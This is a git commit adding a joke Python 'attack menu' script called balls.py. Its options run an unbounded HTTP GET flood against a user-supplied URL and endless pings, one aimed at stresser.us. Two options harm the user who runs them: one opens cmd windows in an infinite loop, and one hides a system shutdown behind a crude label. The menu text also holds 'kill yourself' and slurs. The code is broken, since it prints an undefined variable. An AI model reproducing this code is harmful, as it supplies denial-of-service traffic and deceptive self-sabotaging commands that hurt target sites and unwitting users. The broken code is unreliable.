ce82571289da5d876bfe6c7132866025d7ab7330
/⁶⁶⁶Bunti <58895443+bntr00t@users.noreply.github.com>
2022-02-24 11:52:33 +0100

    Create balls.py

---
+++ balls.py
@@ -0,0 +1,49 @@
+import os
+from colorama import Fore
+import httpx
+
+os.system('cls' if os.name == 'nt' else 'clear')
+title = f'''{Fore.RED}
+                             ┌─┐┌┐ ┌─┐┌─┐┬  ┬ ┬┌┬┐┌─┐  ┌─┐┌─┐┬─┐┌┐ ┌─┐┌─┐┌─┐
+                             ├─┤├┴┐└─┐│ ││  │ │ │ ├┤   │ ┬├─┤├┬┘├┴┐├─┤│ ┬├┤ 
+                             ┴ ┴└─┘└─┘└─┘┴─┘└─┘ ┴ └─┘  └─┘┴ ┴┴└─└─┘┴ ┴└─┘└─┘{Fore.RESET}'''
+
+
+txt = f'''{Fore.MAGENTA}
+                             1. Kill forky
+                             2. kill yourself
+                             3. boot everyone offline
+                             4. get some bitches
+                             5. Http-Deluxe-Ultimate-Layer8-Mega-DDoS-hitalloff{Fore.RESET}'''
+print(title)
+print(x) 
+
+man = input()
+
+if str(man) == "1":
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print('killing forky')
+    os.system('ping -t stresser.us')
+    
+if str(man) == "2":
+    os.system('cls' if os.name == 'nt' else 'clear')
+    while True:
+        for i in range(int(man)):
+            os.system('start cmd')
+            
+if str(man) == "3":
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print('booting, defo ded')
+    os.system('ping -t 0.0.0.0')
+    
+if str(man) == "4":
+    os.system('shutdown /s')
+    
+if str(man) == "5":
+    print('holy wow boot off instant')
+    wow = input('urlgay: ')
+    while True:
+        for i in range(int(man)):
+            r = httpx.get(wow)
+            print('<Response [0 ded]>')
+            
